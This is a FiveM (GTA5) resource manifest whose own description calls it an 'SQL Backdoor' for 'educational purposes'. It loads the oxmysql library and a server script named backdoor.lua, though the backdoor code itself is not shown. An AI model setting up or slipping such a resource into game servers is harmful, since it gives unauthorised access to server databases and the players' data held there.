fx_version 'cerulean'
lua54 'yes'
game 'gta5'

author 'tomiichx'
description 'FiveM SQL Backdoor. Educational purposes only.'

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'backdoor.lua'
}

dependency 'oxmysql'